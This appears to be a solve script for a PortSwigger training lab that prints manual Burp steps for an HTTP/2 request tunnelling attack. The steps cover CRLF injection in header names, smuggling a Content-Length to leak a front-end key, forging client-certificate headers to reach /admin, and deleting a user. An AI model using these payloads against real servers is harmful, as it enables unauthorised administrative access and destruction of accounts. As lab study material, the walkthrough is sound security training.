#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Bypassing access controls via HTTP/2 request tunnelling.

Documentation-first — scripting this requires low-level HPACK framing to
embed real CRLF bytes inside an HTTP/2 header NAME (not value). Manual Burp
Inspector + Shift+Enter is the clean path.

Manual flow:

  1. Confirm HTTP/2 + CRLF-in-name primitive:
       Add header via Inspector:
         Name:  foo: bar<Shift+Enter> Host: abc
         Value: xyz
       Error reflecting 'abc' as Host confirms injection.

  2. Find search reflection endpoint. POST method with search in body.

  3. Smuggle a Content-Length to cut body short. Pad outer body with A's.
       Header Name:
         foo: bar<SE> Content-Length: 500<SE> <SE> search=x

  4. Leak X-FRONTEND-KEY from reflected search output.

  5. Tunnel GET /admin (or /login for smaller response) with forged:
         X-SSL-VERIFIED: 1
         X-SSL-CLIENT-CN: administrator
         X-FRONTEND-KEY: <leaked key>

  6. Change tunnelled path to /admin/delete?username=carlos.
     carlos deleted → lab solved.
"""

import argparse
import re


MANUAL_INSTRUCTIONS = """
Burp Repeater (Inspector → HTTP/2, Update Content-Length off):

STEP 1 — Confirm primitive:
  Add header (Inspector → Request Attributes):
    Name:  foo: bar<Shift+Enter> Host: abc
    Value: xyz
  Send. Error reflecting 'abc' as Host confirms CRLF-in-name works.

STEP 2 — Find search reflection:
  GET /?search=hello → Repeater → upgrade to HTTP/2.
  Confirm 'hello' reflected in response.

STEP 3 — Switch to POST, move search to body.

STEP 4 — Smuggle Content-Length + pad body:
  Add header:
    Name:  foo: bar<SE> Content-Length: 500<SE> <SE> search=x
    Value: xyz
  Body: search=x + 500+ A's.

STEP 5 — Send. Leaked headers appear in reflected search output:
    X-SSL-VERIFIED: 1
    X-SSL-CLIENT-CN: wiener
    X-FRONTEND-KEY: <COPY THIS>
  Copy X-FRONTEND-KEY value.

STEP 6 — Tunnel GET /admin with forged auth:
  Change method to HEAD (minimize response).
  Header Name:
    foo: bar<SE> <SE> GET /admin HTTP/1.1<SE> X-SSL-VERIFIED: 1<SE>
    X-SSL-CLIENT-CN: administrator<SE> X-FRONTEND-KEY: <leaked><SE> <SE>

STEP 7 — If 'not enough bytes' error, test with /login first.

STEP 8 — Final: change tunnelled path to /admin/delete?username=carlos.
  Send → carlos deleted → lab solved.

Target: {host}
"""


def main():
    parser = argparse.ArgumentParser(
        description="Lab 17: HTTP/2 request tunnelling access bypass (manual steps)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    args = parser.parse_args()

    host = re.sub(r"^https?://", "", args.lab_url.rstrip("/"))
    print(MANUAL_INSTRUCTIONS.format(host=host))


if __name__ == "__main__":
    main()
